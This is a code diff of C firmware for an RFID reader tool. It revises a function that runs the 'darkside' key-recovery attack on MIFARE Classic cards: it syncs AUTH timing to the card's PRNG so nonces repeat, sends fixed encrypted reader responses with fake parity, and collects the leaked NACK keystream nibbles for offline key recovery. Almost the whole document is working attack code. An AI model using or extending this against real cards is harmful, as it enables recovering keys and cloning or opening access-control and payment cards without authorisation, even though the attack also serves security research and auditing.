@@ -379,32 +379,29 @@ static u32 chkkeys(const u8 *arg, u32 n, u32 nrar, u8 *out)
 #define NOW() ((u32)(0u - TIMER))
 
 // OP_DARKSIDE: one darkside run (NOTES.md, issue #2). The card leaks a 4-bit encrypted NACK to a
-// wrong {nr}{ar} regardless of parity (always-leak). The card's PRNG free-runs, so the tag nonce is
-// a function of when the AUTH arrives: we fire each AUTH on an absolute grid `sync` ticks apart, so
-// with sync == one PRNG period the nonce repeats. The host first calls with a short `sync` and reads
-// back two nonces (nt0, nt1) to compute the period (dist_nt in Python), then calls with sync = period
-// to collect: lock onto the first nonce and, while it recurs, send a fixed {nr}{ar} for each missing
-// nt_diff (top 3 bits of nr byte 3) and record its NACK keystream. Several runs are intersected
-// (crapto1_darkside). {nr}{ar} uses auth()'s nrar framing.
-//
-// Per-nonce collection slots: the nonce hovers over a few values, so each gets its own 8 nt_diff
-// keystreams; the first to fill all 8 is the run's result.
-#define DS_NCAND 8
-static struct { u32 nt; u8 used, mask, ks[8]; } dscand[DS_NCAND];
+// wrong {nr}{ar} regardless of parity (always-leak). Its PRNG free-runs, so the tag nonce is a function
+// of when the AUTH arrives: each AUTH fires on an absolute grid about one PRNG period (`sync` ticks,
+// host-calibrated) apart, steered like pm3's: lock onto the first nonce, and when another comes back
+// within DS_WIN steps of it, move the next fire by that many steps (phase) and fold a quarter of it into
+// the per-fire correction (the drift the integer grid leaves). On the locked nonce, send a fixed
+// {nr}{ar} for the next missing nt_diff (top 3 bits of nr byte 3) and record its NACK keystream. The
+// host intersects several runs (crapto1_darkside). {nr}{ar} uses auth()'s nrar framing.
+#define DS_WIN 48
 
-// arg: sync(u32 LE) sfracq(s16 LE, per-fire sub-tick grid correction * 256) maxiter(u16 LE) atw(u16
-// LE, NACK wait ticks) nsteps(u8), per step r574 code rx(0/1) len bytes (parity on); acode(u8)
-// alen(u8) aframe[alen] (AUTH, parity off); 8 * nrar[9] (parity off, nt_diff 0..7). Returns nt0(u32)
-// nt1(u32) ks[8] (low nibble each, 0 unfilled) mask(u8). The grid spacing averages sync + sfracq/256
-// ticks, so the systematic per-fire nonce drift cancels and the nonce hovers over a few values.
+// arg: sync(u32 LE) sfracq(s16 LE, per-fire grid correction * 256) maxiter(u16 LE) atw(u16 LE, NACK
+// wait ticks) tq(u16 LE, ticks per PRNG step * 256) nsteps(u8), per step r574 code rx(0/1) len bytes
+// (parity on); acode(u8) alen(u8) aframe[alen] (AUTH, parity off); 8 * nrar[9] (parity off, nt_diff
+// 0..7). Returns nt (u32, the locked nonce) ks[8] (low nibble each) mask(u8, a bit per filled nt_diff,
+// 0xFF = complete) nt1 (u32, the second nonce: with nt the host's period calibration) hits(u8).
 static u32 darkside(const u8 *arg, u32 n, u32 nrar_tx, u8 *out)
 {
 	const u8 *end = arg + n;
-	if (n < 11) return 0;
+	if (n < 13) return 0;
 	u32 sync = get32(arg);
-	int sfracq = (s16)(arg[4] | arg[5] << 8);
-	u32 maxiter = arg[6] | arg[7] << 8, atw = arg[8] | arg[9] << 8, ns = arg[10];
-	const u8 *steps = arg + 11, *q = steps;
+	s32 sfr = (s16)(arg[4] | arg[5] << 8);
+	u32 maxiter = arg[6] | arg[7] << 8, atw = arg[8] | arg[9] << 8, tq = arg[10] | arg[11] << 8;
+	u32 ns = arg[12];
+	const u8 *steps = arg + 13, *q = steps;
 	for (u32 i = 0; i < ns; i++) q += 4 + q[3];
 	u32 acode = q[0], alen = q[1];
 	const u8 *aframe = q + 2;
@@ -412,23 +409,17 @@ static u32 darkside(const u8 *arg, u32 n, u32 nrar_tx, u8 *out)
 	const u8 *nrar = q;
 	if (nrar + 9 * 8 > end) return 0; // host builds a well-formed arg; just guard the frame reads
 
-	// Tick quantization (~0.6 steps/tick) plus TX jitter means an exact 32-bit nonce rarely repeats,
-	// but with sync tuned the nonce hovers over only a few values. Keep a small table and fill each
-	// candidate nonce's 8 nt_diff slots independently; the first to complete wins. Catch-up keeps the
-	// hovering set small so the table doesn't thrash.
-	for (int i = 0; i < DS_NCAND; i++) dscand[i].used = 0;
-	u32 nsamp = 0, done = 0, iters = 0;
+	for (int i = 0; i < 18; i++) out[i] = 0;
+	u32 nsamp = 0, target = 0, lost = 0;
 	u32 fire = NOW() + sync;
 	s32 facc = 0;
-	out[12] = 0; // mask; nt0/ks are filled on completion, nt0 also sampled below for the host
-	for (; iters < maxiter && !done; iters++) {
+	for (u32 iters = 0; iters < maxiter && out[12] != 0xFF; iters++) {
 		REG(PARITY_REG) = 0;
 		if (!send_steps(steps, ns)) continue;
-		// Fire the AUTH on the absolute grid, so the nonce depends on timing only, not on how long the
-		// re-select took. The grid averages sync + sfracq/256 ticks (fractional accumulator) so the
-		// systematic drift cancels. Skip to the next grid point if the re-select already overran this.
+		// Fire on the absolute grid (the nonce depends on timing only, not on how long the re-select
+		// took): sync plus the fractional correction; the next grid point if the re-select overran.
 		fire += sync;
-		facc += sfracq;
+		facc += sfr;
 		s32 cr = facc >> 8;
 		fire += cr;
 		facc -= cr << 8;
@@ -439,38 +430,45 @@ static u32 darkside(const u8 *arg, u32 n, u32 nrar_tx, u8 *out)
 		u32 seen = capture.count, nt;
 		txraw(0, 1, acode, 0x88, aframe, alen);
 		if (!wait_rx(seen, 20000) || !recv_nt(&nt)) continue;
-		if (nsamp == 0) { put32(out, nt); nsamp = 1; }      // nt0 (sample for the host)
-		else if (nsamp == 1) { put32(out + 13, nt); nsamp = 2; }  // nt1 (period calibration)
-		// find this nonce's candidate slot, or allocate the first free one
-		int ci = -1, fr = -1;
-		for (int i = 0; i < DS_NCAND; i++) {
-			if (!dscand[i].used) { if (fr < 0) fr = i; }
-			else if (dscand[i].nt == nt) { ci = i; break; }
-		}
-		if (ci < 0 && fr >= 0) { ci = fr; dscand[ci].used = 1, dscand[ci].nt = nt, dscand[ci].mask = 0; }
-		if (ci < 0) continue; // table full of other nonces; skip this one
+		if (nsamp < 2) put32(out + 13 * nsamp++, nt); // nt (until locked), nt1: the host's calibration
+		if (!target) target = nt;
+		// The card's clock stops in the reader's modulation pauses, so every frame sent costs PRNG
+		// steps (~180 for {nr}{ar}): send {nr}{ar} every time, on target or not, to keep the per-fire
+		// advance the same. A fixed {nr}{ar} for the next missing nt_diff c (fake parity).
 		u32 c = 0;
-		while (c < 8 && (dscand[ci].mask & 1 << c)) c++;
-		if (c == 8) continue;
-		// send a fixed {nr}{ar} for nt_diff c (fake parity), record the 4-bit NACK keystream
-		seen = capture.count;
+		while (out[12] & 1 << c) c++;
+		u32 s2 = capture.count;
 		txraw(0, nrar_tx >> 8 & 0xFF, nrar_tx & 0xFF, 0x88, nrar + 9 * c, 9);
-		if (wait_rx(seen, atw)) {
-			struct frame *f = &capture.ring[(*(volatile u32 *)&capture.count - 1) % N_FRAMES];
-			if (f->len >= 1) {
-				dscand[ci].ks[c] = (f->data[0] & 0xF) ^ 0x5; // NACK ^ 0x05 = keystream nibble
-				dscand[ci].mask |= 1 << c;
-				if (dscand[ci].mask == 0xFF) {
-					put32(out, dscand[ci].nt);
-					for (int k = 0; k < 8; k++) out[4 + k] = dscand[ci].ks[k];
-					out[12] = 0xFF;
-					done = 1;
-				}
+		u32 got = wait_rx(s2, atw);
+		if (nt == target) {
+			lost = 0;
+			out[17]++;
+			if (got) { // the NACK ^ 0x05 is the keystream nibble
+				struct frame *f = &capture.ring[(*(volatile u32 *)&capture.count - 1) % N_FRAMES];
+				if (f->len >= 1) out[4 + c] = (f->data[0] & 0xF) ^ 0x5, out[12] |= 1 << c;
 			}
+			continue;
 		}
+		// steps from the target to nt (+ = fired late), within DS_WIN
+		s32 dd = 0;
+		u32 x = target, y = nt;
+		for (s32 i = 1; i <= DS_WIN && !dd; i++) {
+			x = prng_successor(x, 1), y = prng_successor(y, 1);
+			if (x == nt) dd = i;
+			if (y == target) dd = -i;
+		}
+		if (!dd) { // lost it: after a few, lock onto where the nonce is now
+			if (++lost > 3) target = nt, out[12] = 0, lost = 0;
+			continue;
+		}
+		lost = 0;
+		s32 cc = dd * (s32)tq;
+		facc -= cc;
+		sfr -= cc >> 2;
 	}
+	put32(out, target);
 	REG(PARITY_REG) = 0;
-	return 17;
+	return 18;
 }
 
 // (OP_SNAP, the framer snapshot used once for NFC-V exploration, was removed to make room for the
